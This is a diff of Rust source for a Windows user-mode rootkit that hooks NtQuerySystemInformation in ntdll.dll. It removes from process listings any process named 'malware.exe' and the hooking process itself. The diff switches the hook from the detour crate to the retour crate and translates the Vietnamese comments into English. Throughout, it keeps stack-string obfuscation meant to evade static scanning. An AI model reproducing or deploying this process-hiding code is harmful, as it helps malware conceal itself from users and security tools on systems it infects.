@@ -1,13 +1,10 @@
-use detour::static_detour;
 use std::error::Error;
-use std::ffi::CStr;
 use std::mem;
-use std::sync::atomic::{AtomicBool, Ordering};
-use winapi::shared::minwindef::{DWORD, ULONG};
-use winapi::shared::ntdef::{HANDLE, NTSTATUS, PVOID, UNICODE_STRING, STRING};
-use winapi::um::winnt::{ACCESS_MASK, PACCESS_MASK};
+use winapi::shared::minwindef::ULONG;
+use winapi::shared::ntdef::{HANDLE, NTSTATUS, PVOID, UNICODE_STRING};
 use winapi::shared::basetsd::{SIZE_T, ULONG_PTR};
 use std::slice;
+use std::ptr::null_mut;
 
 // Define function signature for NtQuerySystemInformation
 type NtQuerySystemInformationFn = unsafe extern "system" fn(
@@ -17,9 +14,8 @@ type NtQuerySystemInformationFn = unsafe extern "system" fn(
     ReturnLength: *mut ULONG,
 ) -> NTSTATUS;
 
-static_detour! {
-    static NtQuerySystemInformationHook: NtQuerySystemInformationFn;
-}
+// Manual static storage for the hook (avoids macro issues)
+static mut HOOK: Option<retour::GenericDetour<NtQuerySystemInformationFn>> = None;
 
 // SystemProcessInformation = 5
 const SYSTEMS_PROCESS_INFORMATION: u32 = 5;
@@ -63,26 +59,25 @@ struct SYSTEM_PROCESS_INFORMATION {
     OtherTransferCount: i64,
 }
 
-/// Kiểm tra xem Image Name có khớp với mục tiêu cần ẩn không
+/// Check if Image Name matches the target to hide
 unsafe fn is_target_process(image_name: &UNICODE_STRING) -> bool {
     if image_name.Buffer.is_null() || image_name.Length == 0 {
         return false;
     }
     
-    // Chuyển đổi con trỏ UTF-16 sang Slice để so sánh
+    // Convert UTF-16 pointer to Slice for comparison
     let name_slice = slice::from_raw_parts(
         image_name.Buffer, 
         (image_name.Length / 2) as usize
     );
 
-    // Tên cần ẩn: "malware.exe" (Mã hóa dạng mảng u16 để tránh lộ String tĩnh)
+    // Target to hide: "malware.exe"
     let target_name = [
         'm' as u16, 'a' as u16, 'l' as u16, 'w' as u16, 
         'a' as u16, 'r' as u16, 'e' as u16, '.' as u16, 
         'e' as u16, 'x' as u16, 'e' as u16
     ];
 
-    // So sánh contains để bắt cả đường dẫn đầy đủ hoặc tên file
     if name_slice.len() >= target_name.len() {
         return name_slice.windows(target_name.len()).any(|window| window == target_name);
     }
@@ -92,7 +87,6 @@ unsafe fn is_target_process(image_name: &UNICODE_STRING) -> bool {
 
 pub fn install_hooks() -> Result<(), Box<dyn Error>> {
     unsafe {
-        // Kỹ thuật Stack String: Tránh bị detect bởi lệnh "strings" hoặc quét tĩnh
         // "ntdll.dll"
         let dll_name = [
             'n' as u8, 't' as u8, 'd' as u8, 'l' as u8, 
@@ -123,9 +117,12 @@ pub fn install_hooks() -> Result<(), Box<dyn Error>> {
 
         let target: NtQuerySystemInformationFn = mem::transmute(address);
 
-        NtQuerySystemInformationHook
-            .initialize(target, nt_query_system_information_detour)?
-            .enable()?;
+        // retour manual initialization
+        let hook = retour::GenericDetour::new(target, nt_query_system_information_detour)?;
+        hook.enable()?;
+        
+        // Store the hook in static mutable option
+        HOOK = Some(hook);
     }
     Ok(())
 }
@@ -140,8 +137,13 @@ unsafe extern "system" fn nt_query_system_information_detour(
     system_information_length: ULONG,
     return_length: *mut ULONG,
 ) -> NTSTATUS {
-    // Call original function first
-    let status = NtQuerySystemInformationHook.call(
+    // Call original function via the stored hook
+    let original = match HOOK.as_ref() {
+        Some(hook) => hook,
+        None => return 0xC0000001u32 as NTSTATUS, // STATUS_UNSUCCESSFUL if hook gone
+    };
+
+    let status = original.call(
         system_information_class,
         system_information,
         system_information_length,
@@ -156,8 +158,6 @@ unsafe extern "system" fn nt_query_system_information_detour(
         loop {
             let current = &mut *current_ptr;
             
-            // LOGIC MỚI: Kiểm tra tên thay vì chỉ PID
-            // Nếu là target hoặc là chính PID của process này (để tự bảo vệ)
             let should_hide = is_target_process(&current.ImageName) 
                               || current.UniqueProcessId as usize == get_current_process_id() as usize;
 
@@ -171,15 +171,10 @@ unsafe extern "system" fn nt_query_system_information_detour(
                         prev.NextEntryOffset += current.NextEntryOffset;
                     }
                 } else {
-                    // Trường hợp node đầu tiên (hiếm gặp vì System Idle Process thường là đầu)
-                    // Nếu cần ẩn node đầu, chúng ta Zero memory bản ghi này để nó trông như "Idle" hoặc xóa thông tin nhạy cảm.
-                    // Tuy nhiên, trong UserMode detour, việc thay đổi con trỏ gốc `system_information` là khó khăn.
-                    // Chúng ta sẽ xóa ImageName để tàng hình tên.
                     current.ImageName.Length = 0;
                     current.UniqueProcessId = null_mut();
                 }
             } else {
-                // Nếu không ẩn, cập nhật prev_ptr
                 prev_ptr = current_ptr;
             }
 
